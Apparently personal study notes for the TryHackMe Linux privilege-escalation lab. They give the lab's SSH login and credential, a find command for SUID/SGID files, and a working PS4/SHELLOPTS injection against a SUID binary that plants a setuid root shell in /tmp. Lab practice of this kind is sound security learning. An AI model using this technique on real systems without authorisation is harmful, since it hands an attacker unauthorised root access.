# TEST SETUP/ENVIRONMENT

# MANUAL ENUMERATION 

# AUTOMATED ENUMERATION 

# MISCONFIGURATIONS/VULNERABILITIES EXPLOITATION 

## TRYHACKME

https://tryhackme.com/room/linuxprivesc

ssh user@1.1.1.1

ssh -oHostKeyAlgorithms=+ssh-dss user@1.1.1.1

pass:password321

## CATEGORY "SUID / SGID EXECUTEABLES" - ABUSING SHELL FEATURES 2

```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2

/tmp/rootbash -p

rm /tmp/rootbash

exit
```
